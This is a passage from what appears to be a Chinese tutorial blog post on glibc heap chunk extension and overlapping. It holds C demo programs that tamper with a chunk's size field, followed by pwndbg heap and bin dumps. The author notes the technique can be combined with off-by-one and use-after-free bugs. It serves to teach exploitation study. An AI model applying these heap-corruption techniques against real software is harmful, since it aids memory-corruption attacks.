class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000041&lt;======原Chunk1</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000021&lt;======原Chunk2</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000020fc1&lt;======Top Chunk</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>​除去 chunk1 的 size 域变化了以外，似乎没有其他变化，但是，逻辑上来说，现在的堆里只有一个 chunk 了，之后 free 掉 chunk1 看看：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x41</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758040</span><br><span class="line">Size: 0x20fc1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bins</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x555555758000 ◂— 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>​之后读取下内存：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000041</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000020fc1</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>​下一步是重头戏，试想，如果原 chunk1 的 size 域没有真正变化，那么我们进行 malloc 一个 0x30 大小的堆块的时候，就不会分配到这个地址上，而是从 Top Chunk 里拆分，那么事实上是怎么样的呢？实践出真知，看一下吧：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x41</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758040</span><br><span class="line">Size: 0x20fc1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bins</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000041</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000020fc1&lt;======Top Chunk</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>​显然，Top Chunk 并未被拆分，这里确定了，似乎 malloc (0x30) 得到的堆块是原 Chunk1 的地址，这里说明了，这里的原 chunk1 因为 size 域被修改了之后成为了一个新的更大的堆块，这里也就造成了所谓的堆重叠了，chunk1 因为修改了 size 域后，生成的那个新的 chunk 和 chunk2 部分重叠了，这也就导致了，有的对原 chunk1 的修改可以修改到 chunk2 的地方，如果 chunk2 保留了指针，那就可以对 chunk2 进行伪造，可以结合类似 off by one 和 UAF 形成很多种利用方式。</p><h2 id="2-对inuse的smallbin进行extend"><a class="markdownIt-Anchor" href="#2-对inuse的smallbin进行extend">#</a> 2、对 inuse 的 smallbin 进行 extend：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g 2.c</span></span><br><span class="line"><span class="comment">//注意把之前那个a.out给删掉</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//分配第一个 0x80 的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第二个 0x10 的chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//防止与top chunk合并</span></span><br><span class="line"></span><br><span class="line">    *(<span class="type">long</span> *)((<span class="type">long</span>)ptr<span class="number">-0x8</span>)=<span class="number">0xb1</span>;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​首先进行三次分配，其中，第三次分配是防止 extend 后，chunk 与 topchunk 进行合并，无需关注。先看看经过三次 malloc 之后的堆空间是啥样的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758090</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580b0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580d0</span><br><span class="line">Size: 0x20f31</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/40gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000091&lt;======Chunk1</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000021&lt;======Chunk2</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000021&lt;======Chunk3</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000020f31&lt;======Top Chunk</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580f0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758100: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758110: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758120: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758130: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>​估摸一下，chunk1 的大小似乎有点大，导致 free 掉的 chunk1 并不会进入 fastbin，而是进入 smallbin，那么修改了 size 域后，原本三个 chunk 在 gdb 里的 heap 指令下依旧少了一个:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0xb1</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580b0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580d0</span><br><span class="line">Size: 0x20f31</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bins</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/40gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x00000000000000b1&lt;======Chunk1</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000021&lt;======Chunk2</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000021&lt;======Chunk3</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000020f31&lt;======Top Chunk</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580f0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758100: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758110: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758120: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758130: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>​下一步，free 掉 chunk1：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0xb1</span><br><span class="line">fd: 0x7ffff7dd1b78</span><br><span class="line">bk: 0x7ffff7dd1b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5555557580b0</span><br><span class="line">Size: 0x20</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580d0</span><br><span class="line">Size: 0x20f31</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555758000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555758000</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/40gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x00000000000000b1&lt;======Chunk1</span><br><span class="line">0x555555758010: 0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000021&lt;======Chunk2</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x00000000000000b0  0x0000000000000020&lt;======Chunk3</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000020f31&lt;======Top Chunk</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580f0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758100: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758110: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758120: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758130: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>​这里发现了一个点需要注意，就是 free 掉 size 域修改了之后的那个 chunk1 之后，chunk3 的 size 域的最低为，也就是 p 位，变成了 0，这也就说明，chunk1 没有放在 fastbin 里，上面也看到了，被放在了 unsortedbin 里。</p><p>​那么为啥会被放入 unsortedbin 内而不是 smallbin 呢？估计有一下几种可能：</p><ul><li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsortedbin 中。</li><li>释放一个不属于 fastbin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 就会被放到 unsorted bin 中，当第二次分配的时候，没有在 unsortedbin 中找到合适的，才会被放入到其对应的 bin 中。</li></ul><p>​之后进行分配，分配 0xa0 大小的堆块，就会发现，原 chunk1 的地址依旧拿去用了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0xb1</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580b0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580d0</span><br><span class="line">Size: 0x20f31</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/40gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x00000000000000b1</span><br><span class="line">0x555555758010: 0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x00000000000000b0  0x0000000000000021</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000020f31</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580f0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758100: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758110: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758120: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758130: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><h2 id="3-对free的smallbin进行extend"><a class="markdownIt-Anchor" href="#3-对free的smallbin进行extend">#</a> 3、对 free 的 smallbin 进行 extend：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g 3.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//分配第一个0x80的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第二个0x10的chunk2</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);<span class="comment">//首先进行释放，使得chunk1进入unsorted bin</span></span><br><span class="line"></span><br><span class="line">    *(<span class="type">long</span> *)((<span class="type">long</span>)ptr<span class="number">-0x8</span>)=<span class="number">0xb1</span>;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​首先是两次 malloc：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 